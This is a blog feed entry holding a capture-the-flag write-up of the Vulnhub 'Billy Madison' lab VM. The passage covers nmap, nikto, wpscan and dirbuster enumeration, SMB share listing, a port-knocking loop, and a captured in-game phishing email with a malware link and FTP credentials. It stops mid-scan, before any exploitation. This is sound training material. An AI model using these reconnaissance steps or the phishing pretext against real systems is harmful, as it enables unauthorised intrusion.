<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="http://jekyllrb.com" version="3.4.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2017-03-22T09:17:45+00:00</updated><id>http://localhost:4000/</id><title type="html">Root Network Security</title><subtitle>RootNetSec is a site about journey through the world of network security, pentesting, Linux administration, programming an networking. View to learn more!</subtitle><entry><title type="html">Vulnhub.com - Billy Madison 1.1</title><link href="http://localhost:4000/vulnhub-billy-madison/" rel="alternate" type="text/html" title="Vulnhub.com - Billy Madison 1.1" /><published>2017-03-19T02:00:00+00:00</published><updated>2017-03-19T02:00:00+00:00</updated><id>http://localhost:4000/vulnhub-billy-madison</id><content type="html" xml:base="http://localhost:4000/vulnhub-billy-madison/">&lt;h1&gt;Introduction&lt;/h1&gt;

&lt;p&gt;Today we're going to try and root another machine from Vulnhub called &lt;a href=&quot;https://www.vulnhub.com/entry/billy-madison-11,161/&quot;&gt;&lt;b&gt;Billy Madison&lt;/b&gt;&lt;/a&gt;. Our objective is to figure out how Eric took over the machine, undo his changes and recover Billy's 12th grade final project. Sounds great! &lt;/p&gt;

&lt;h1&gt;Write-Up&lt;/h1&gt;
&lt;h2&gt;Service Discovery&lt;/h2&gt;

&lt;p&gt;Our machine was assigned &lt;b&gt;10.0.2.4&lt;/b&gt; IP address. Let's fire off an comprehensive Nmap scan to look for attack surface.  &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;nmap -sS -sU -Pn -p- 10.0.2.4

Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-03-12 11:04 EDT
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.4
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00084s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
Not shown: 65535 open|filtered ports, 65526 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
23/tcp   open   telnet
69/tcp   open   tftp
80/tcp   open   http
137/tcp  closed netbios-ns
138/tcp  closed netbios-dgm
139/tcp  open   netbios-ssn
445/tcp  open   microsoft-ds
2525/tcp open   ms-v-worlds
MAC Address: 08:00:27:2B:54:39 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;209.02 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2&gt;Telnet&lt;/h2&gt;
&lt;p&gt;Firstly I tried connecting via &lt;b&gt;ssh&lt;/b&gt;, unfortunately without luck. After a few attempts I decided to check out &lt;b&gt;telnet port 23&lt;/b&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;telnet 10.0.2.4
Trying 10.0.2.4...
Connected to 10.0.2.4.
Escape character is &lt;span class=&quot;s1&quot;&gt;'^]'&lt;/span&gt;.


&lt;span class=&quot;k&quot;&gt;*****&lt;/span&gt; HAHAH! You&lt;span class=&quot;s1&quot;&gt;'re banned for a while, Billy Boy!  By the way, I caught you trying to hack my wifi - but the joke'&lt;/span&gt;s on you! I don&lt;span class=&quot;s1&quot;&gt;'t use ROTten passwords like rkfpuzrahngvat anymore! Madison Hotels is as good as MINE!!!! *****

Connection closed by foreign host.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;False alarm? After a while of thinking I can see a small clue in the second part of the message - &lt;b&gt;ROT&lt;/b&gt; and &lt;b&gt;rkfpuzrahngvat&lt;/b&gt;. ROT13 encryption? Yes! After decrypting the string we got this word - &lt;b&gt;exschmenuating&lt;/b&gt;.&lt;/p&gt;

&lt;p&gt;Unluckily, now I have no idea how to use it, so let's just note that for later. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;ncat -v 192.168.110.105 23
Ncat: Version 7.25BETA1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org/ncat &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Ncat: Connection refused.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;In addition it seems that we are banned from telnet.&lt;/p&gt;

&lt;h2&gt;Website - port 80&lt;/h2&gt;

&lt;p&gt;We can move on to the potential website running at port &lt;b&gt;80&lt;/b&gt;. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/billy-madison/billy-website.png&quot; alt=&quot;Billy's Website&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Unfortunately I don't see anything useful here, apart from random quotes coming from &lt;i&gt;Billy Madison&lt;/i&gt; film. Maybe &lt;b&gt;Nikto&lt;/b&gt; will tell us something more useful?&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;nikto -h 10.0.2.4
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.2.4
+ Target Hostname:    10.0.2.4
+ Target Port:        80
+ Start Time:         2017-03-12 16:04:42 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a different fashion to the MIME &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;
+ No CGI Directories found &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s1&quot;&gt;'-C all'&lt;/span&gt; to force check all possible &lt;span class=&quot;nb&quot;&gt;dirs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ Web Server returns a valid response with junk HTTP methods, this may cause &lt;span class=&quot;nb&quot;&gt;false &lt;/span&gt;positives.
+ Server leaks inodes via ETags, header found with file /manual/, fields: 0x272 0x537ae56951000
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7535 requests: 0 error&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and 8 item&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; reported on remote host
+ End Time:           2017-03-12 16:05:04 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;22 seconds&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
---------------------------------------------------------------------------
+ 1 host&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; tested&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;No clues, and nothing hidden in the page, or the headers. Luckily we have plenty of other ports open in this machine. &lt;/p&gt;

&lt;h2&gt;Wordpress - port 69&lt;/h2&gt;

&lt;p&gt;Next move is to check port &lt;b&gt;69&lt;/b&gt;, which is running &lt;b&gt;http&lt;/b&gt; service. Another website? &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/billy-madison/billy-wordpress.png&quot; alt=&quot;Billy's WordPress Blog&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Wow, an old school WordPress 1.0. Let's run another portion of scans. Firstly &lt;b&gt;Nikto&lt;/b&gt;.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;nikto -h 10.0.2.4 -port 69
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.2.4
+ Target Hostname:    10.0.2.4
+ Target Port:        69
+ Start Time:         2017-03-12 16:14:20 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
---------------------------------------------------------------------------
+ Server: MadisonHotelsWordpress
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a different fashion to the MIME &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;
+ No CGI Directories found &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s1&quot;&gt;'-C all'&lt;/span&gt; to force check all possible &lt;span class=&quot;nb&quot;&gt;dirs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS
+ OSVDB-3092: /xmlrpc.php: xmlrpc.php was found.
+ /readme.html: This WordPress file reveals the installed version.
+ /wp-login.php: Wordpress login found
+ /wp-content/plugins/gravityforms/change_log.txt: Gravity forms is installed. Based on the version number &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the changelog, it is vulnerable to an authenticated SQL injection. https://wpvulndb.com/vulnerabilities/7849
+ 7551 requests: 13 error&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and 8 item&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; reported on remote host
+ End Time:           2017-03-12 16:13:55 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;26 seconds&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
---------------------------------------------------------------------------
+ 1 host&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; tested&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Maybe &lt;b&gt;WPScan&lt;/b&gt;?&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;wpscan --url 10.0.2.4:69
_______________________________________________________________
        __          _______   _____                  
        &lt;span class=&quot;se&quot;&gt;\ \ &lt;/span&gt;       / /  __ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/ ____|                 
         &lt;span class=&quot;se&quot;&gt;\ \ &lt;/span&gt; /&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; / /| |__&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;___   ___  __ _ _ __  
          &lt;span class=&quot;se&quot;&gt;\ \/&lt;/span&gt;  &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt; / |  ___/ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/ __|/ _&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; | &lt;span class=&quot;s1&quot;&gt;'_ \
           \  /\  /  | |     ____) | (__| (_| | | | |
            \/  \/   |_|    |_____/ \___|\__,_|_| |_|

        WordPress Security Scanner by the WPScan Team
                       Version 2.9
          Sponsored by Sucuri - https://sucuri.net
   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
_______________________________________________________________

The plugins directory '&lt;/span&gt;wp-content/plugins&lt;span class=&quot;s1&quot;&gt;' does not exist.
You can specify one per command line option (don'&lt;/span&gt;t forget to include the wp-content directory &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;needed&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;?] Continue? &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Y]es &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;N]o, default: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;N]
Y
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] URL: http://10.0.2.4:69/
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Started: Sun Mar 12 16:17:13 2017

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;!] The WordPress &lt;span class=&quot;s1&quot;&gt;'http://10.0.2.4:69/readme.html'&lt;/span&gt; file exists exposing a version number
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Interesting header: SERVER: MadisonHotelsWordpress
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] XML-RPC Interface available under: http://10.0.2.4:69/xmlrpc.php

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] WordPress version 1.0 identified from meta generator

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] WordPress theme &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;use: twentyeleven

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Name: twentyeleven
 |  Latest version: 2.5
 |  Location: http://10.0.2.4:69/wp-content/themes/twentyeleven/
 |  Readme: http://10.0.2.4:69/wp-content/themes/twentyeleven/readme.txt
 |  Changelog: http://10.0.2.4:69/wp-content/themes/twentyeleven/changelog.txt
 |  Style URL: http://10.0.2.4:69/wp-content/themes/twentyeleven/style.css
 |  Referenced style.css: http://10.0.2.4:69/static/wp-content/themes/twentyeleven/style.css
 |  Description:

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Enumerating plugins from passive detection ...
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] No plugins found

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Finished: Sun Mar 12 16:17:13 2017
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Requests Done: 36
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Memory used: 6.344 MB
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Elapsed &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 00:00:00&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;No luck here, I don't even think that WPScan is working against such an old version of WordPress. &lt;/p&gt;

&lt;h2&gt;Exschmenuating?&lt;/h2&gt;

&lt;p&gt;After a while of thinking I've found that there is additional page in Billy's website - &lt;b&gt;http://10.0.2.4/exschmenuating/&lt;/b&gt;. Maybe we'll get more clues on this one? &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/billy-madison/billy-exschmenuating.png&quot; alt=&quot;Billy's Exschmenuating Subpage&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Journal? Firstly let's take a look at &lt;b&gt;Log monitor&lt;/b&gt;, then we'll come back to its content. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;---
2017-03-12-15-35-01
Hosts currently banned
Chain INPUT (policy DROP)
DROP       all  --  10.0.2.15            anywhere
---
If your IP appears in this list it has been banned, and you will need to reset this host to lift the ban. Otherwise, further efforts to connect to this host may produce false positives or refuse connections altogether.
---&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now let's reset our machine and once again take a look at the log. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;---
2017-03-12-15-38-01
Hosts currently banned
Chain INPUT &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;policy DROP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
---
If your IP appears &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this list it has been banned, and you will need to reset this host to lift the ban. Otherwise, further efforts to connect to this host may produce &lt;span class=&quot;nb&quot;&gt;false &lt;/span&gt;positives or refuse connections altogether.
---&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;After connecting a few facts I've noticed that the log was showing entries banned from &lt;b&gt;telnet&lt;/b&gt;.&lt;/p&gt;

&lt;p&gt;But we have another clue, in the &lt;b&gt;08/03/16&lt;/b&gt; part of a page saying: &lt;/p&gt;
&lt;p&gt;&lt;i&gt;I .captured the whole thing in this folder for later lulz. I put 'veronica' somewhere in the file name&lt;/i&gt; &lt;/p&gt;

&lt;h2&gt;veronica.cap&lt;/h2&gt;

&lt;p&gt;Is it some &lt;b&gt;.cap&lt;/b&gt; file? With &lt;b&gt;veronica&lt;/b&gt; in file name? Let's prepare for &lt;b&gt;dirbuster&lt;/b&gt; by firstly creating an wordlist. I'm going to use rockyou.txt file, but only with grepped &lt;b&gt;veronica&lt;/b&gt;. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:/usr/share/wordlists# &lt;/span&gt;cat rockyou.txt | grep &lt;span class=&quot;s2&quot;&gt;&quot;veronica&quot;&lt;/span&gt; &amp;gt; veronica.txt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And now we're ready to run dirbuster. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/billy-madison/billy-dirbuster.png&quot; alt=&quot;Dirbuster&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Awesome, we have found a file! It's another &lt;b&gt;.cap&lt;/b&gt; file, this time it contains email conversation between Veronica and Eric. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;MAIL FROM:&amp;lt;eric@madisonhotels.com&amp;gt;
RCPT TO:&amp;lt;vvaughn@polyfector.edu&amp;gt;
DATA
Date: Sat, 20 Aug 2016 21:56:50 -0500
To: vvaughn@polyfector.edu
From: eric@madisonhotels.com
Subject: VIRUS ALERT!
X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/

Hey Veronica,

Eric Gordon here.  

I know you use Billy's machine more than he does, so I wanted to let you know that the company is rolling out a new antivirus program for all work-from-home users.  Just &amp;lt;a href=&quot;http://areallyreallybad.malware.edu.org.ru/f3fs0azjf.php&quot;&amp;gt;click here&amp;lt;/a&amp;gt; to install it, k?  

Thanks. -Eric


.
QUIT

EHLO kali
MAIL FROM:&amp;lt;vvaughn@polyfector.edu&amp;gt;
RCPT TO:&amp;lt;eric@madisonhotels.com&amp;gt;
DATA
Date: Sat, 20 Aug 2016 21:57:00 -0500
To: eric@madisonhotels.com
From: vvaughn@polyfector.edu
Subject: test Sat, 20 Aug 2016 21:57:00 -0500
X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
RE: VIRUS ALERT!

Eric,

Thanks for your message. I tried to download that file but my antivirus blocked it.

Could you just upload it directly to us via FTP?  We keep FTP turned off unless someone connects with the &quot;Spanish Armada&quot; combo.

https://www.youtube.com/watch?v=z5YU7JwVy7s

-VV


.
QUIT

EHLO kali
MAIL FROM:&amp;lt;eric@madisonhotels.com&amp;gt;
RCPT TO:&amp;lt;vvaughn@polyfector.edu&amp;gt;
DATA
Date: Sat, 20 Aug 2016 21:57:11 -0500
To: vvaughn@polyfector.edu
From: eric@madisonhotels.com
Subject: test Sat, 20 Aug 2016 21:57:11 -0500
X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
RE[2]: VIRUS ALERT!

Veronica,

Thanks that will be perfect.  Please set me up an account with username of &quot;eric&quot; and password &quot;ericdoesntdrinkhisownpee&quot;.

-Eric


.
QUIT

EHLO kali
MAIL FROM:&amp;lt;vvaughn@polyfector.edu&amp;gt;
RCPT TO:&amp;lt;eric@madisonhotels.com&amp;gt;
DATA
Date: Sat, 20 Aug 2016 21:57:21 -0500
To: eric@madisonhotels.com
From: vvaughn@polyfector.edu
Subject: test Sat, 20 Aug 2016 21:57:21 -0500
X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
RE[3]: VIRUS ALERT!

Eric,

Done.

-V


.
QUIT

EHLO kali
MAIL FROM:&amp;lt;eric@madisonhotels.com&amp;gt;
RCPT TO:&amp;lt;vvaughn@polyfector.edu&amp;gt;
DATA
Date: Sat, 20 Aug 2016 21:57:31 -0500
To: vvaughn@polyfector.edu
From: eric@madisonhotels.com
Subject: test Sat, 20 Aug 2016 21:57:31 -0500
X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
RE[4]: VIRUS ALERT!

Veronica,

Great, the file is uploaded to the FTP server, please go to a terminal and run the file with your account - the install will be automatic and you won't get any pop-ups or anything like that.  Thanks!

-Eric


.
QUIT

EHLO kali
MAIL FROM:&amp;lt;vvaughn@polyfector.edu&amp;gt;
RCPT TO:&amp;lt;eric@madisonhotels.com&amp;gt;
DATA
Date: Sat, 20 Aug 2016 21:57:41 -0500
To: eric@madisonhotels.com
From: vvaughn@polyfector.edu
Subject: test Sat, 20 Aug 2016 21:57:41 -0500
X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
RE[5]: VIRUS ALERT!

Eric,

I clicked the link and now this computer is acting really weird.  The antivirus program is popping up alerts, my mouse started to move on its own, my background changed color and other weird stuff.  I'm going to send this email to you and then shut the computer down.  I have some important files I'm worried about, and Billy's working on his big 12th grade final.  I don't want anything to happen to that!

-V


.
QUIT&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2&gt;Port knocking, SMB and ftp&lt;/h2&gt;

&lt;p&gt;Wow, that's some solid portion of clues. Let's list what we know. &lt;/p&gt;

&lt;p&gt;We have credentials to ftp &lt;b&gt;eric&lt;/b&gt; with password &lt;b&gt;ericdoesntdrinkhisownpee&lt;/b&gt;. But what is this &lt;b&gt;Spanish Armada combo&lt;/b&gt;? Some secret code? I'll come back to it later.&lt;/p&gt;

&lt;p&gt;For now we can move to other ports - especially &lt;b&gt;SMB&lt;/b&gt; running on ports &lt;b&gt;139&lt;/b&gt; and &lt;b&gt;445&lt;/b&gt;. We can firstly check if there are any shares available on the target.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;smbclient -L 10.0.2.4
Enter root&lt;span class=&quot;s1&quot;&gt;'s password:
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]

	Sharename       Type      Comment
	---------       ----      -------
	EricsSecretStuff Disk      
	IPC$            IPC       IPC Service (BM)
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]

	Server               Comment
	---------            -------
	BM                   BM

	Workgroup            Master
	---------            -------
	WORKGROUP            BM&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great, now we can see if we can connect, and also try to download all of the files stored in the share. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;smbclient //10.0.2.4/EricsSecretStuff
Enter root&lt;span class=&quot;s1&quot;&gt;'s password:
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]
smb: \&amp;gt; ls -la
NT_STATUS_NO_SUCH_FILE listing \-la
smb: \&amp;gt; ls
  .                                   D        0  Sun Mar 12 16:37:40 2017
  ..                                  D        0  Sat Aug 20 14:56:45 2016
  ._.DS_Store                        AH     4096  Wed Aug 17 10:32:07 2016
  ebd.txt                             N       35  Sun Mar 12 16:37:40 2017
  .DS_Store                          AH     6148  Wed Aug 17 10:32:12 2016

		59164 blocks of size 524288. 49861 blocks available
smb: \&amp;gt; get ebd.txt
getting file \ebd.txt of size 35 as ebd.txt (4.9 KiloBytes/sec) (average 4.9 KiloBytes/sec)
smb: \&amp;gt; get ._.DS_Store
getting file \._.DS_Store of size 4096 as ._.DS_Store (1333.3 KiloBytes/sec) (average 403.4 KiloBytes/sec)
smb: \&amp;gt; get .DS_Store
getting file \.DS_Store of size 6148 as .DS_Store (750.5 KiloBytes/sec) (average 557.7 KiloBytes/sec)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Ok, now let's view what &lt;b&gt;edb.txt&lt;/b&gt; has inside. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/billy-madison/billy-edb.png&quot; alt=&quot;EDB Note&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hmmm, some kind of backdoor? Unfortunately this information won't tell us anything so let's keep it in mind for later. &lt;/p&gt;

&lt;p&gt;After quite a lot of time connecting all known facts, especially after watching &lt;a href=&quot;https://www.youtube.com/watch?v=z5YU7JwVy7s&quot;&gt;&lt;b&gt;this video&lt;/b&gt;&lt;/a&gt;, I've figured out that these dates look like a &lt;b&gt;port knocking sequence&lt;/b&gt;. We can try to knock using this simple bash script. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;x &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;1466 67 1469 1514 1981 1986 1588; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;nmap -Pn --host_timeout 201 --max-retries 0 -p &lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt; 10.0.2.4; &lt;span class=&quot;k&quot;&gt;done

&lt;/span&gt;Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-03-13 13:57 EDT
Warning: 10.0.2.4 giving up on port because retransmission cap hit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.4
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00058s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
PORT     STATE    SERVICE
1466/tcp filtered oceansoft-lm
MAC Address: 08:00:27:2B:54:39 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0.45 seconds

Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-03-13 13:57 EDT
Warning: 10.0.2.4 giving up on port because retransmission cap hit &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.4
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00048s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
PORT   STATE    SERVICE
67/tcp filtered dhcps
MAC Address: 08:00:27:2B:54:39 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

